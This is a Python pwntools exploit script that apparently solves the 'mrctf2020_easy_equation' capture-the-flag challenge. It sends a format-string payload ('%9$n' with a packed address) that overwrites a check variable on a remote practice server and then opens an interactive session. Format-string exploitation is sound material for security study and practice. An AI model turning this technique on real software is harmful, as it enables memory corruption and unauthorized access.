# coding:utf-8
from pwn import *
context.log_level = 'debug'

elf = ELF('./mrctf2020_easy_equation')
islocal = 0
if islocal:
    p = process('./mrctf2020_easy_equation')
else:
    p = remote('node4.buuoj.cn', 25776)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
judge_addr = 0x60105c
payload = 'aa%9$nbbb' + p64(judge_addr)

p.sendline(payload)

p.interactive()
